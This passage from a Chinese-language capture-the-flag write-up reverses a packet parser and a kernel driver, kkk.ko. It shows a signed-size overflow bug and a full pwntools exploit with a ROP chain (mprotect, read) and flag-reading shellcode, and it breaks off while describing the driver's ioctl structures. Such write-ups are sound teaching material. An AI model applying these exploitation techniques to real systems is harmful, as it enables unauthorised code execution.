 0004: 0x15 0x00 0x0a 0xffffffff  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> 0xffffffff<span class="o">)</span> goto <span class="m">0015</span>
 0005: 0x15 0x08 0x00 0x00000000  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> <span class="nb">read</span><span class="o">)</span> goto <span class="m">0014</span>
 0006: 0x15 0x07 0x00 0x00000001  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> write<span class="o">)</span> goto <span class="m">0014</span>
 0007: 0x15 0x06 0x00 0x00000002  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> open<span class="o">)</span> goto <span class="m">0014</span>
 0008: 0x15 0x05 0x00 0x00000003  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> close<span class="o">)</span> goto <span class="m">0014</span>
 0009: 0x15 0x04 0x00 0x00000009  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> mmap<span class="o">)</span> goto <span class="m">0014</span>
 0010: 0x15 0x03 0x00 0x0000000a  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> mprotect<span class="o">)</span> goto <span class="m">0014</span>
 0011: 0x15 0x02 0x00 0x0000000b  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> munmap<span class="o">)</span> goto <span class="m">0014</span>
 0012: 0x15 0x01 0x00 0x00000010  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> ioctl<span class="o">)</span> goto <span class="m">0014</span>
 0013: 0x06 0x00 0x00 0x00050005  <span class="k">return</span> ERRNO<span class="o">(</span>5<span class="o">)</span>
 0014: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 0015: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL
</code></pre></td></tr></table>
</div>
</div><p>当然，其实直接先把用到 kkk.ko 的全部 patch 掉也行。</p>
<h2 id="step1">step1</h2>
<p>在这一部分，我们会攻破用户态程序 parser，拿到 shell or 实现任意代码执行。</p>
<h3 id="协议逆向">协议逆向</h3>
<p>对协议进行逆向，结果大概是这个样子</p>
<h4 id="packet_hdr">packet_hdr</h4>
<p>头部 0x30 字节，程序用 <code>get_packet_hdr</code> 来赋值。它包含了这些信息和要求</p>
<ul>
<li><code>packet_hdr[:4]</code> 需要是 <code>p32(0xAAA)</code></li>
<li><code>packet_hdr[4:8]</code> 需要是 <code>p32(1)</code></li>
<li><code>packet_hdr[16:20]</code> 是 size 域，<code>size &gt; 0x877</code> 则报错</li>
<li><code>packet_hdr[20:24]</code> 是校验和，会过一个 crc32</li>
</ul>
<h4 id="segment_hdr">segment_hdr</h4>
<p>紧跟着是一个 0x8 字节的头部，赋值在 <code>get_segements</code> 函数中。它包含了这些信息</p>
<ul>
<li><code>segment_hdr[:4]</code> 标识了后续 segment 的段数 cnt，<code>cnt &gt; 7</code> or <code>cnt &lt;= 1</code> 则报错</li>
<li><code>segment_hdr[4:8]</code> 是另一个大小域 size2，<code>size2 + 0x38 &gt; size</code> 则报错</li>
</ul>
<h4 id="segment">segment</h4>
<p>然后就是 cnt 个 segment，每个 segment 包含了这些信息</p>
<ul>
<li><code>segment[4:8]</code> 是这个 segment 内容的大小域 con_size，<code>con_size &gt; 0x100</code> 则报错。它会过一个 0x20 字节向上对齐的操作。</li>
<li><code>segment[8:]</code> 是用户随意输入的内容，大小为 con_size</li>
</ul>
<h3 id="demo">demo</h3>
<p>CRC的值其实可以每次调试拿到，比如这里的 <code>0x796f15c9</code>。可以试一下这个 demo exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./parser&#34;</span><span class="p">)</span>

<span class="c1"># input()</span>
<span class="c1"># gdb.attach(io, &#34;b *0x401B22&#34;)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ENTER YOUR PACKET &gt; &#34;</span><span class="p">)</span>

<span class="c1">### pakcet_hdr 0 - 0x30</span>

<span class="n">packet_hdr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xAAA</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x877</span><span class="p">)</span> <span class="c1"># a1[4]</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x796f15c9</span><span class="p">)</span> <span class="c1"># crc32</span>
<span class="n">packet_hdr</span> <span class="o">=</span> <span class="n">packet_hdr</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>


<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">packet_hdr</span><span class="p">)</span>

<span class="c1">### segment_hdr 0x30 - 0x38</span>

<span class="n">cnt</span> <span class="o">=</span> <span class="mi">2</span>
<span class="n">segment_hdr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">cnt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># a1[:30]</span>

<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">segment_hdr</span><span class="p">)</span>

<span class="c1">### segment 0x38 - </span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">cnt</span><span class="p">):</span>

    <span class="c1">### header 8 bytes</span>
    <span class="n">size</span> <span class="o">=</span> <span class="mh">0x100</span>
    <span class="n">segment</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
    <span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">segment</span><span class="p">)</span> 

    <span class="c1">### content size bytes</span>
    <span class="n">content</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x100</span>
    <span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>


<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>可以看到确实和 kkk.ko 交互了，交互顺序与程序一致。证明协议逆向没什么问题。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@x1do0:/home/x1do0/linux_share/actf/kkk# dmesg -c
<span class="o">[</span>61111.167379<span class="o">]</span> kkk_open<span class="o">()</span>
<span class="o">[</span>61111.173754<span class="o">]</span> kkk_internal_ioctl<span class="o">()</span>
<span class="o">[</span>61111.173754<span class="o">]</span> KKK_IOCTL_ADD
<span class="o">[</span>61111.173755<span class="o">]</span> kkk_internal_ioctl<span class="o">()</span>
<span class="o">[</span>61111.173755<span class="o">]</span> KKK_IOCTL_LAUNCH
<span class="o">[</span>61111.173756<span class="o">]</span> kkk_internal_ioctl<span class="o">()</span>
<span class="o">[</span>61111.173756<span class="o">]</span> KKK_IOCTL_DUMP
<span class="o">[</span>61111.173766<span class="o">]</span> kkk_internal_ioctl<span class="o">()</span>
<span class="o">[</span>61111.173769<span class="o">]</span> KKK_IOCTL_DETACH
<span class="o">[</span>61116.897292<span class="o">]</span> kkk_close<span class="o">()</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v11</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">next_type</span> <span class="o">=</span> <span class="o">*</span><span class="n">next_ptr</span><span class="p">;</span>
    <span class="n">next_size</span> <span class="o">=</span> <span class="n">align</span><span class="p">(</span><span class="n">next_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">next_con</span> <span class="o">=</span> <span class="n">size_shift</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">next_ptr</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">cur_size</span> <span class="o">=</span> <span class="n">align</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">v10</span> <span class="o">+</span> <span class="mi">4</span><span class="p">));</span>
    <span class="n">cur_con</span> <span class="o">=</span> <span class="n">size_shift</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">add</span><span class="p">(</span><span class="n">cur_con</span><span class="p">,</span> <span class="n">cur_size</span><span class="p">,</span> <span class="n">next_con</span><span class="p">,</span> <span class="n">next_size</span><span class="p">,</span> <span class="n">next_type</span><span class="p">);</span><span class="c1">// 0x6B64 add
</span><span class="c1"></span>    <span class="n">launch</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>                              <span class="c1">// 0x6B6B Launch
</span><span class="c1"></span>    <span class="n">next_con_2</span> <span class="o">=</span> <span class="n">size_shift</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">next_ptr</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">cur_con_2</span> <span class="o">=</span> <span class="n">size_shift</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">show</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">cur_con_2</span><span class="p">,</span> <span class="n">next_con_2</span><span class="p">);</span>         <span class="c1">// 0x6B69 Dump
</span><span class="c1"></span>    <span class="n">release</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>                             <span class="c1">// 0x6b6D detach
</span><span class="c1"></span>  <span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="漏洞">漏洞</h3>
<p>在 <code>get_segements</code> 中读取 segment 内容的大小域时，只需要 int 值不大于 0x100 就行了。但是在后续读取以及 <code>parse_and_run</code> 解析时会把这个域 解析成 unsigned int。所以如果一开始 size 赋值为负数，它能绕过检测，并且在后续解析成一个巨大的 unsigned int 造成溢出。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span>
<span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+220h] [rbp-40h]
</span><span class="c1"></span>

<span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v5</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">size_shift</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v6</span><span class="p">,</span> <span class="n">v8</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">read_through_base64</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
      <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
    <span class="c1">// ...  
</span><span class="c1"></span>
    <span class="n">v2</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">size_shift</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">read_through_base64</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>    <span class="c1">// int -&gt; unsigned int
</span><span class="c1"></span>
    <span class="c1">//...
</span><span class="c1"></span>
</code></pre></td></tr></table>
</div>
</div><h3 id="利用">利用</h3>
<p>于是可以在 <code>main</code> 中 <code>v4</code> 变量造成栈溢出，没开 canary。实际上如果 cnt 为 1，它虽然不会走到 <code>parse_and_run</code> 但是已经导致了栈溢出。当然，输入多个 segment 也行。</p>
<p>PoC 如下。至此，我们达到了用户态任意代码执行的目标。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;/home/x1do0/.local/lib/python3.8/site-packages&#39;</span><span class="p">)</span>
<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;/home/x1do0/.local/lib/python3.8/site-packages/unicornafl-1.0.3-py3.8.egg&#39;</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>


<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;75&#39;</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">con</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">con</span><span class="p">))</span>


<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./parser&#34;</span><span class="p">)</span>

<span class="c1"># input()</span>
<span class="c1"># gdb.attach(io, &#34;b *0x401B22&#34;)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;ENTER YOUR PACKET &gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ENTER YOUR PACKET &gt; &#34;</span><span class="p">)</span>

<span class="c1">### pakcet_hdr 0 - 0x30</span>

<span class="n">packet_hdr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xAAA</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x877</span><span class="p">)</span> <span class="c1"># a1[4]</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x796f15c9</span><span class="p">)</span> <span class="c1"># crc32</span>
<span class="n">packet_hdr</span> <span class="o">=</span> <span class="n">packet_hdr</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>


<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">packet_hdr</span><span class="p">)</span>

<span class="c1">### segment_hdr 0x30 - 0x38</span>

<span class="n">cnt</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">segment_hdr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">cnt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># a1[:30]</span>

<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">segment_hdr</span><span class="p">)</span>

<span class="c1">### segment 0x38 - </span>


<span class="c1">### header 8 bytes</span>
<span class="n">size</span> <span class="o">=</span> <span class="mh">0xf0000000</span>
<span class="n">segment</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">segment</span><span class="p">)</span> 

<span class="c1">### content size bytes</span>

<span class="c1"># 0x00000000004006a6 : pop rdi ; ret</span>
<span class="c1"># 0x000000000045c139 : pop rdx ; pop rsi ; ret</span>
<span class="c1"># 0x00000000004005af : pop rax ; ret</span>
<span class="c1"># 0x00000000004859c5 : syscall ; ret</span>


<span class="c1"># mprotect(buf, 0x1000, 4|2|1)</span>

<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x6DB4A0</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x00000000004006a6</span><span class="p">,</span> <span class="n">buf_addr</span><span class="o">&amp;</span><span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">),</span>
        <span class="mh">0x000000000045c139</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span>
        <span class="mh">0x00000000004005af</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span>
        <span class="mh">0x00000000004859c5</span><span class="p">)</span>

<span class="c1"># read(0, buf, 0x100)</span>

<span class="n">rop</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x00000000004006a6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
        <span class="mh">0x000000000045c139</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span>
        <span class="mh">0x00000000004005af</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
        <span class="mh">0x00000000004859c5</span><span class="p">)</span>

<span class="c1"># ret2shellcode</span>

<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>

<span class="n">content</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x848</span> <span class="o">+</span> <span class="n">rop</span>
<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>



<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x200</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x200</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">))</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>

<span class="c1"># 0x7ffdbdb52b80</span>
<span class="c1"># return at 0x7ffdbdb533c8</span>


<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></td></tr></table>
</div>
</div><h2 id="step2">step2</h2>
<p>到现在为止，我们实现了任意代码执行，可以和 kkk.ko 驱动随意交互。在这一部分，我们将攻破内核态驱动，拿到 root 权限。</p>
<h3 id="驱动逆向">驱动逆向</h3>
<p>对着 kkk.ko 看，可以明确协议的更多域，比如：</p>
<ul>
<li>
<p><code>segment[1]</code> 是 enc</p>
</li>
<li>
<p><code>segment[2]</code> 是 kkk_type，enum 型，标识了 kkk.ko 处理的加密方案。</p>
</li>
</ul>
<p>但再去看这个协议并没有多少意义，因为我们已经可以直接用 <code>ioctl</code> 去和驱动交互了。有以下这些交互选项</p>
<h4 id="open">open</h4>
<p>初始化，把 filep 的 private_data 赋值成自建的结构体 <code>kkk_desc</code>，这个结构体里有个 <code>kkk_obj</code> 指针数组</p>
<h4 id="close">close</h4>
<p>退出，释放、清零指针。</p>
<h4 id="0x6b64-add">0x6B64 add</h4>
<p>这里 <code>add</code> 送入的参数 con 是以结构体 <code>kkk_ioctl_add_arg</code> 形式，有如下域</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">kkk_ioctl_add_arg</span>
<span class="p">{</span>
    <span class="k">enum</span> <span class="n">kkk_type</span> <span class="n">type</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">enc</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">key</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">data</span><span class="p">;</span>
<span class="p">};</span>

<span class="cm">/* core data strcutres */</span>
<span class="k">struct</span> <span class="n">kkk_pack</span>
